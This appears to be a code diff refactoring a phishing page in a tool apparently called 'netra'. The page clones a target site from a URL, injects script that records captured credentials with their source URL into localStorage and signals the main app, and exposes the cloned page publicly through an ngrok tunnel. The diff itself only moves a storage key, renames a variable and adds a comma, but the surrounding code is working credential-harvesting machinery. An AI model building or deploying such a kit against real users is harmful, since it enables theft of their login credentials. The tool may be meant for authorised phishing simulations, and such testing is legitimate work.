@@ -30,10 +30,11 @@ const clonerSchema = z.object({
   path: ['urlToClone'],
 });
 
+const storageKey = 'netra-captured-credentials';
+
 export default function PhishingPage() {
   const { toast } = useToast();
   const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
-  const storageKey = 'netra-captured-credentials';
   const { user } = useAuth();
 
   const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
@@ -135,15 +136,15 @@ export default function PhishingPage() {
               source: window.location.href,
               timestamp: new Date().toISOString()
             };
-            const storageKey = 'netra-captured-credentials';
+            
             try {
-              const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+              const existingData = JSON.parse(localStorage.getItem('${storageKey}') || '[]');
               const updatedData = [...existingData, entry];
-              localStorage.setItem(storageKey, JSON.stringify(updatedData));
+              localStorage.setItem('${storageKey}', JSON.stringify(updatedData));
 
               // This event notifies our main app window that new credentials were captured.
               window.dispatchEvent(new StorageEvent('storage', {
-                key: storageKey,
+                key: '${storageKey}',
                 newValue: JSON.stringify(updatedData)
               }));
             } catch(e) {
@@ -219,7 +220,7 @@ export default function PhishingPage() {
       toast({ title: 'HTML Prepared', description: 'Raw HTML is ready for hosting.' });
     } catch (e) {
       const error = e instanceof Error ? e.message : 'An unknown error occurred';
-      toast({ variant: 'destructive', title: 'Processing Failed', description: error });
+      toast({ variant: 'destructive', title: 'Processing Failed', description: error, });
     } finally {
       setIsProcessing(false);
     }
@@ -238,8 +239,8 @@ export default function PhishingPage() {
       await startNgrokTunnel();
 
       const pageId = crypto.randomUUID();
-      const storageKey = `phishing-html-${pageId}`;
-      localStorage.setItem(storageKey, modifiedHtml);
+      const pageStorageKey = `phishing-html-${pageId}`;
+      localStorage.setItem(pageStorageKey, modifiedHtml);
       
       // Poll for the URL
       pollIntervalRef.current = setInterval(async () => {
